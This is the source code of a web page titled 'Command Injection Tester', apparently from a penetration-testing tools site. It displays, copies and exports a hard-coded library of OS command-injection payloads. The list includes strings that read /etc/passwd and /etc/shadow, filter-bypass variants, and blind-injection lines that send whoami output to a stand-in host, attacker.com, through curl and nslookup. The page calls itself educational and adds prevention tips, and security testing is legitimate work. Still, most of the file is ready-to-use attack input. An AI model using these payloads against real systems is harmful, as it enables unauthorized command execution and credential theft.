"use client";

import React, { useState } from "react";
import {
    Terminal,
    Copy,
    Download,
    Shield,
    AlertTriangle,
    Code,
    Zap,
    Filter,
    Info,
    CheckCircle2,
    Lock
} from "lucide-react";

type PayloadCategory = "linux" | "windows" | "blind" | "time-based" | "bypass";

type Payload = {
    name: string;
    payload: string;
    description: string;
    severity: "high" | "medium" | "low";
    os: string[];
};

const PAYLOADS: Record<PayloadCategory, Payload[]> = {
    linux: [
        { name: "Basic Command Chaining", payload: "; ls -la", description: "Execute commands after the original command", severity: "high", os: ["Linux", "macOS"] },
        { name: "Pipe to Command", payload: "| cat /etc/passwd", description: "Pipe output to another command", severity: "high", os: ["Linux", "macOS"] },
        { name: "Command Substitution", payload: "`whoami`", description: "Execute command and substitute result", severity: "high", os: ["Linux", "macOS"] },
        { name: "Subshell Execution", payload: "$(id)", description: "Execute command in subshell", severity: "high", os: ["Linux", "macOS"] },
        { name: "AND Operator", payload: "&& cat /etc/shadow", description: "Execute if previous command succeeds", severity: "high", os: ["Linux", "macOS"] },
        { name: "OR Operator", payload: "|| whoami", description: "Execute if previous command fails", severity: "medium", os: ["Linux", "macOS"] },
        { name: "Background Execution", payload: "& sleep 10", description: "Run command in background", severity: "medium", os: ["Linux", "macOS"] },
        { name: "Newline Injection", payload: "\ncat /etc/passwd", description: "Inject newline to execute command", severity: "high", os: ["Linux", "macOS"] },
    ],
    windows: [
        { name: "Command Chaining", payload: "& dir", description: "Execute commands sequentially", severity: "high", os: ["Windows"] },
        { name: "Pipe Command", payload: "| type C:\\Windows\\System32\\drivers\\etc\\hosts", description: "Pipe to another command", severity: "high", os: ["Windows"] },
        { name: "AND Operator", payload: "&& whoami", description: "Execute if previous succeeds", severity: "high", os: ["Windows"] },
        { name: "OR Operator", payload: "|| hostname", description: "Execute if previous fails", severity: "medium", os: ["Windows"] },
        { name: "PowerShell Execution", payload: "; powershell -c Get-Process", description: "Execute PowerShell command", severity: "high", os: ["Windows"] },
        { name: "Environment Variable", payload: "%COMPUTERNAME%", description: "Access environment variables", severity: "low", os: ["Windows"] },
    ],
    blind: [
        { name: "DNS Exfiltration", payload: "; nslookup $(whoami).attacker.com", description: "Exfiltrate data via DNS", severity: "high", os: ["Linux", "macOS"] },
        { name: "HTTP Callback", payload: "; curl http://attacker.com?data=$(whoami)", description: "Send data via HTTP", severity: "high", os: ["Linux", "macOS"] },
        { name: "File Creation", payload: "; touch /tmp/pwned", description: "Create file to verify execution", severity: "medium", os: ["Linux", "macOS"] },
        { name: "Ping Callback", payload: "& ping -n 1 attacker.com", description: "Network callback verification", severity: "medium", os: ["Windows"] },
    ],
    "time-based": [
        { name: "Sleep Command (Linux)", payload: "; sleep 10", description: "Delay execution by 10 seconds", severity: "medium", os: ["Linux", "macOS"] },
        { name: "Timeout (Windows)", payload: "& timeout /t 10", description: "Delay execution by 10 seconds", severity: "medium", os: ["Windows"] },
        { name: "Ping Delay (Linux)", payload: "; ping -c 10 127.0.0.1", description: "Use ping for time delay", severity: "medium", os: ["Linux", "macOS"] },
        { name: "Ping Delay (Windows)", payload: "& ping -n 10 127.0.0.1", description: "Use ping for time delay", severity: "medium", os: ["Windows"] },
    ],
    bypass: [
        { name: "Quote Escape", payload: "'; whoami; '", description: "Break out of quoted string", severity: "high", os: ["All"] },
        { name: "Double Quote Escape", payload: "\"; whoami; \"", description: "Break out of double quotes", severity: "high", os: ["All"] },
        { name: "Backtick Escape", payload: "`; whoami; `", description: "Break out of backticks", severity: "high", os: ["All"] },
        { name: "Null Byte Injection", payload: "%00; whoami", description: "Use null byte to terminate string", severity: "high", os: ["All"] },
        { name: "Space Bypass (Tab)", payload: ";cat\t/etc/passwd", description: "Use tab instead of space", severity: "medium", os: ["Linux", "macOS"] },
        { name: "Space Bypass (IFS)", payload: ";cat${IFS}/etc/passwd", description: "Use IFS variable for space", severity: "medium", os: ["Linux", "macOS"] },
        { name: "Wildcard Expansion", payload: ";cat /etc/pass*", description: "Use wildcards to bypass filters", severity: "medium", os: ["Linux", "macOS"] },
    ],
};

async function copyText(text: string, onSuccess: () => void) {
    try {
        await navigator.clipboard.writeText(text);
        onSuccess();
    } catch {
        alert("Copy failed");
    }
}

function downloadBlob(content: string, filename: string, mime = "text/plain") {
    const blob = new Blob([content], { type: mime });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
}

function getSeverityColor(severity: string) {
    switch (severity) {
        case "high": return "bg-red-100 text-red-700 border-red-300";
        case "medium": return "bg-amber-100 text-amber-700 border-amber-300";
        case "low": return "bg-blue-100 text-blue-700 border-blue-300";
        default: return "bg-slate-100 text-slate-700 border-slate-300";
    }
}

export default function CommandInjectionTester() {
    const [selectedCategory, setSelectedCategory] = useState<PayloadCategory>("linux");
    const [searchQuery, setSearchQuery] = useState("");
    const [copiedPayload, setCopiedPayload] = useState<string | null>(null);

    const categories = [
        { id: "linux" as PayloadCategory, label: "Linux/macOS", icon: Terminal, color: "from-emerald-500 to-teal-600" },
        { id: "windows" as PayloadCategory, label: "Windows", icon: Terminal, color: "from-blue-500 to-indigo-600" },
        { id: "blind" as PayloadCategory, label: "Blind Injection", icon: Shield, color: "from-purple-500 to-pink-600" },
        { id: "time-based" as PayloadCategory, label: "Time-Based", icon: Zap, color: "from-amber-500 to-orange-600" },
        { id: "bypass" as PayloadCategory, label: "Bypass Techniques", icon: Lock, color: "from-rose-500 to-red-600" },
    ];

    const filteredPayloads = PAYLOADS[selectedCategory].filter(p =>
        p.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
        p.payload.toLowerCase().includes(searchQuery.toLowerCase()) ||
        p.description.toLowerCase().includes(searchQuery.toLowerCase())
    );

    function exportPayloads() {
        const content = `# Command Injection Payloads - ${selectedCategory.toUpperCase()}

${PAYLOADS[selectedCategory].map((p, i) => `
## ${i + 1}. ${p.name}
**Payload:** \`${p.payload}\`
**Description:** ${p.description}
**Severity:** ${p.severity.toUpperCase()}
**OS:** ${p.os.join(", ")}
`).join("\n")}

---
Generated by SecuTools.io Command Injection Tester
`;
        downloadBlob(content, `command-injection-${selectedCategory}.md`, "text/markdown");
    }

    return (
        <div className="min-h-screen bg-gradient-to-br from-emerald-50 via-teal-50 to-green-50 p-4 sm:p-6 lg:p-8">
            <div className="max-w-7xl mx-auto space-y-6">
                {/* Header */}
                <div className="text-center space-y-3">
                    <div className="inline-flex items-center gap-2 px-4 py-2 bg-white/60 backdrop-blur-sm rounded-full border border-emerald-200 shadow-sm">
                        <Terminal className="w-5 h-5 text-emerald-600" />
                        <span className="text-sm font-medium text-emerald-900">Penetration Testing</span>
                    </div>
                    <h1 className="text-4xl sm:text-5xl font-bold bg-gradient-to-r from-emerald-600 via-teal-600 to-green-600 bg-clip-text text-transparent">
                        Command Injection Tester
                    </h1>
                    <p className="text-slate-600 max-w-2xl mx-auto">
                        Comprehensive payload library for testing OS command injection vulnerabilities.
                        Educational tool for security researchers and developers.
                    </p>
                </div>

                {/* Warning Banner */}
                <div className="bg-amber-50 border-2 border-amber-200 rounded-xl p-4">
                    <div className="flex items-start gap-3">
                        <AlertTriangle className="w-5 h-5 text-amber-600 flex-shrink-0 mt-0.5" />
                        <div className="text-sm text-amber-800">
                            <strong className="font-semibold">Ethical Use Only:</strong> These payloads are for authorized security testing and educational purposes only.
                            Unauthorized access to computer systems is illegal.
                        </div>
                    </div>
                </div>

                {/* Category Tabs */}
                <div className="bg-white/70 backdrop-blur-xl rounded-2xl shadow-xl border border-white/20 p-6">
                    <div className="flex items-center justify-between mb-4">
                        <h2 className="text-lg font-semibold text-slate-800 flex items-center gap-2">
                            <Filter className="w-5 h-5 text-emerald-600" />
                            Payload Categories
                        </h2>
                        <button
                            onClick={exportPayloads}
                            className="px-4 py-2 bg-gradient-to-r from-emerald-600 to-teal-600 text-white rounded-lg text-sm font-semibold hover:shadow-lg transition-all flex items-center gap-2"
                        >
                            <Download className="w-4 h-4" />
                            Export
                        </button>
                    </div>

                    <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-3">
                        {categories.map((cat) => (
                            <button
                                key={cat.id}
                                onClick={() => setSelectedCategory(cat.id)}
                                className={`p-4 rounded-xl border-2 transition-all ${selectedCategory === cat.id
                                        ? "border-emerald-500 bg-emerald-50 shadow-md"
                                        : "border-slate-200 hover:border-emerald-300 bg-white"
                                    }`}
                            >
                                <cat.icon className={`w-6 h-6 mx-auto mb-2 ${selectedCategory === cat.id ? "text-emerald-600" : "text-slate-400"
                                    }`} />
                                <div className={`text-sm font-semibold ${selectedCategory === cat.id ? "text-emerald-900" : "text-slate-600"
                                    }`}>
                                    {cat.label}
                                </div>
                                <div className="text-xs text-slate-500 mt-1">
                                    {PAYLOADS[cat.id].length} payloads
                                </div>
                            </button>
                        ))}
                    </div>

                    {/* Search */}
                    <div className="mt-4">
                        <input
                            type="text"
                            value={searchQuery}
                            onChange={(e) => setSearchQuery(e.target.value)}
                            placeholder="Search payloads..."
                            className="w-full px-4 py-3 rounded-xl border-2 border-slate-200 focus:border-emerald-500 focus:ring-4 focus:ring-emerald-100 outline-none transition-all"
                        />
                    </div>
                </div>

                {/* Payloads Grid */}
                <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                    {filteredPayloads.map((payload, idx) => (
                        <div
                            key={idx}
                            className="bg-white/70 backdrop-blur-xl rounded-xl shadow-lg border border-white/20 overflow-hidden hover:shadow-xl transition-all"
                            style={{ animation: `slideIn 0.3s ease-out ${idx * 0.05}s both` }}
                        >
                            <div className="p-5 space-y-3">
                                <div className="flex items-start justify-between gap-3">
                                    <div className="flex-1">
                                        <h3 className="font-semibold text-slate-800 mb-1">{payload.name}</h3>
                                        <p className="text-sm text-slate-600">{payload.description}</p>
                                    </div>
                                    <span className={`px-3 py-1 rounded-lg text-xs font-semibold border ${getSeverityColor(payload.severity)}`}>
                                        {payload.severity.toUpperCase()}
                                    </span>
                                </div>

                                <div className="bg-slate-900 rounded-lg p-4 relative group">
                                    <code className="text-emerald-400 font-mono text-sm break-all">
                                        {payload.payload}
                                    </code>
                                    <button
                                        onClick={() => copyText(payload.payload, () => {
                                            setCopiedPayload(payload.payload);
                                            setTimeout(() => setCopiedPayload(null), 2000);
                                        })}
                                        className="absolute top-2 right-2 p-2 bg-slate-800 hover:bg-slate-700 rounded-lg opacity-0 group-hover:opacity-100 transition-all"
                                    >
                                        {copiedPayload === payload.payload ? (
                                            <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                                        ) : (
                                            <Copy className="w-4 h-4 text-slate-400" />
                                        )}
                                    </button>
                                </div>

                                <div className="flex items-center gap-2 text-xs text-slate-500">
                                    <Code className="w-3 h-3" />
                                    <span>OS: {payload.os.join(", ")}</span>
                                </div>
                            </div>
                        </div>
                    ))}
                </div>

                {filteredPayloads.length === 0 && (
                    <div className="text-center py-12">
                        <Info className="w-12 h-12 text-slate-400 mx-auto mb-3" />
                        <p className="text-slate-600">No payloads found matching your search.</p>
                    </div>
                )}

                {/* Info Card */}
                <div className="bg-white/50 backdrop-blur-sm rounded-xl border border-slate-200 p-6">
                    <div className="flex items-start gap-3">
                        <Shield className="w-5 h-5 text-emerald-600 flex-shrink-0 mt-0.5" />
                        <div className="text-sm text-slate-600">
                            <strong className="text-slate-900">Prevention Tips:</strong> Always validate and sanitize user input.
                            Use parameterized commands or safe APIs. Avoid shell execution when possible.
                            Implement proper input validation, whitelisting, and least privilege principles.
                        </div>
                    </div>
                </div>
            </div>

            <style jsx>{`
        @keyframes slideIn {
          from {
            opacity: 0;
            transform: translateY(10px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
      `}</style>
        </div>
    );
}
